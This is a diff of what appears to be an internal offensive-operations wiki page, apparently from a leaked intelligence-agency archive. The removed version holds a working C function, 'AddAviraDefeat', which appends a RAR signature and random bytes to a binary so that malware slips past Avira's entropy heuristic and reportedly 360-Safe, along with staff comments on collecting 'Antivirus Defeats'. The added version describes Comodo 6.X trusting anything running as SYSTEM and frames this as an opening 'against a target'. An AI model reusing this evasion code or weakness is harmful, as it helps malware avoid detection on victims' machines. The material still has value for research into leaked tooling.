@@ -1,109 +1,12 @@
 
                         Owner: User #71473
-Avira Entropy Defeat
-Avira has an entropy-based heuristic that will flag binaries that contain large sections of compressed/encrypted data. Experimentation leads us to believe that this detection is proportional and will detect files that have ~5% or more high entropy data.
-Padding the file to reduce this proportion defeats the technique but is not ideal. Fortunately, we can achieve the same affect by adding a RARFile compression algorithm signature with a few bytes of data to the binary in an arbitrary location. For simplicity’s sake, appending to the end seems to do the trick.
-NOTE: This seems to also work against 360-Safe as well, at least under Pocket Orb.
-BOOL AddAviraDefeat(LPCTSTR szTargetFile)
-{
-    HCRYPTPROV hCryptProv;
-    BYTE pbData[28];
-    DWORD dwWritten, dwRead;
-    CHAR rarBuffer[32] = "Rar!";
-    CHAR tmpBuffer[32] = {0};
- 
-    // check for existing defeat
-    HANDLE hFile = CreateFile(szTargetFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile != INVALID_HANDLE_VALUE)
-    {
-        SetFilePointer(hFile, -32, NULL, FILE_END);
-        if (!ReadFile(hFile, tmpBuffer, 32, &dwRead, NULL) || dwRead != 32)
-        {
-            printf("WARNING: Couldn't read file to check for existing Avira defeat. You should manually check for the defeat at the end of the file and add if necessary -- see AviraDefeat folder on User #?'s share.\n");
-            CloseHandle(hFile);
-            return FALSE;            
-        };
- 
-        CloseHandle(hFile);
-        tmpBuffer[4] = '\0';
-        if (stricmp(tmpBuffer, "RAR!") == 0)
-        {
-            printf("Avira defeat already exists.");
-            return TRUE;
-        }
-    }
- 
-    if (!CryptAcquireContext(&hCryptProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
-    {
-        printf("WARNING: Couldn't get crypto context for random data for Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
-        return FALSE;
-    }
- 
-    if(!CryptGenRandom(hCryptProv, 28, pbData))
-    {
-        printf("WARNING: Couldn't generate random data for Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
-        CryptReleaseContext(hCryptProv, 0);
-        return FALSE;
-    }
- 
-    CryptReleaseContext(hCryptProv, 0);
- 
-    memcpy(rarBuffer + 4, pbData, 28);
- 
-    hFile = CreateFile(szTargetFile, GENERIC_READ|FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile != INVALID_HANDLE_VALUE)
-    {
-        if (!WriteFile(hFile, rarBuffer, 32, &dwWritten, NULL) || dwWritten != 32)
-        {
-            printf("WARNING: Couldn't add Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
-            CloseHandle(hFile);
-            return FALSE;
-        }
-    }
- 
-    CloseHandle(hFile);
-    return TRUE;
-}
-
-Comments:
-
-
-2013-06-20 09:03 
-[User #71473]: 
-
-I'm planning to do that We also still have a lot of old snippets for doing useful stuff in Windows in the OSBOperation Support Branch SourceSafe that are handy but need to be migrated over.  Thanks for the exemplars, that should be helpful.
- 
-
-
-2013-06-20 08:55 
-[User #524297]: 
-
-Another thing you can do is put it into Stash if you want to revision control it.  You can either host individual repositories underneath your own profile, or create a "Antivirus Defeats" project with multiple repositories underneath for each defeat.  Check out how User #1179891 did the iOS projects or how User #1179751 did IMPROVISE. 
-
-
-2013-06-19 17:03 
-[User #71473]: 
-
-Thank you good sir!
-
-
-2013-06-03 14:55 
-[User #524297]: 
-
-There is a "Code Block" macro.  Hit the "+" and select "Other Macros".  Type "code" in the search and it'll pop up.  You can select the formatting in there too. 
-
-
-2013-06-03 07:24 
-[User #71473]: 
-
-Wondering if there is a way to get C code to format the way the old wiki does it with syntax highlighting and all that groovy goodness...
-
-
+Comodo 6.X Gaping Hole of DOOM
+Comodo, as you may know, is a colossal pain in the posterior.  It literally catches everything until you tell it not to, including standard windows services (say what?!?).
+...at least, that's what happens on Comodo 5.X.  In 6.X, Comodo apparently decided that catching things that were part of windows was a Bad Thing(tm).  Their "fix" was... kinda lame
+Anything running as SYSTEM is automatically legit under 6.X.  ANYTHING.  Let that sink in.  Got a kernel level exploit?  Good, because you can drop the kitchen sink and the contents of your garage and as long as you continue to run as SYSTEM you are golden.  Yeah.
+Needless to say, Comodo 6.X doesn't catch nearly as much stuff.  Comodo's user base, paranoid bastards that they are, has apparently caught wind of this and lots of them haven't upgraded to 6.X.  Kind of a shame, cuz this is a hole you could drive a very large wheeled freight carrying vehicle through.  However, if you're lucky enough to be going against a target running 6.X, have fun!
 
 Previous versions:
 | 1 
-| 2 
-| 3 
-| 4 
 |
                     
